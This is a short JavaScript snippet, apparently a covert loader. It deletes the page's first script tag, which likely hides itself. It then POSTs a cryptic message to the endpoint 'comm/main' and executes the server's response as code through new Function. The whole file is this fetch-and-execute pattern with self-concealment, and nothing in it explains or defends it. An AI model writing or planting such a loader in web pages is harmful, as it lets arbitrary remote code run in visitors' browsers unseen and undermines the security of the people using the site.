var body=document.body;
body.removeChild(body.getElementsByTagName("script")[0]);
var xhr = new (window.XMLHttpRequest || ActiveXObject)('Microsoft.XMLHTTP');
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        new Function(xhr.responseText).call(window);
    }
};
xhr.open('POST', 'comm/main');
xhr.send("step into my sight..");